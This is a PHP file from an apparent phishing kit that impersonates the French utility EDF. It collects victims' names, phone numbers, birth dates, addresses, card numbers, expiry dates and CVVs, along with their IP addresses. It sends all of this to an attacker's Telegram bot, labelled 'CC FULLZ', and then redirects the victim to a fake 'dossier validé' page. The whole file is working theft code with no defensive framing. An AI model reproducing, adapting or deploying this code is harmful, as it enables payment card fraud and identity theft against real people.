<?php

ob_start();
session_start();

$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";

 
            $subject = $_SERVER['REMOTE_ADDR'] . ' | EDF | CC FULLZ';

			            $message = "/-- INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= "🔰 Prénom : " . $_SESSION['Prénom'] . "\r\n";
            $message .= "🔰 Nom : " . $_SESSION['Nom'] . "\r\n";
            $message .= "🔰 numéro : " . $_SESSION['numéro'] . "\r\n";
            $message .= "🔰 Date de naissance : " . $_SESSION['dob'] . "\r\n";
            $message .= "🔰 Adresse : " . $_SESSION['Adresse'] . "\r\n";
            $message .= "🔰 Code Postal : " . $_SESSION['Postal'] . "\r\n";
            
			$message .= "/-- FIN DU FULLZ --/". "\r\n";
            
			$message .= "💳 Numéro de carte : " . $_POST['CC'] . "\r\n";
            $message .= "💳 Expiration de la carte : " . $_POST['expi'] . "\r\n";
            $message .= "💳 CVV de la carte : " . $_POST['CVV'] . "\r\n";
           
		   $message .= "/-- FIN --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
			
			require_once "rez.php";
{
                $apiToken = $tg_botapi;
                $data = [
                'chat_id' => $tg_chatid, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );                                                                                                                                                                                                                                                                                                                                                                 
            };
header('Location:./dossier-valide/index.php'); ?>

 

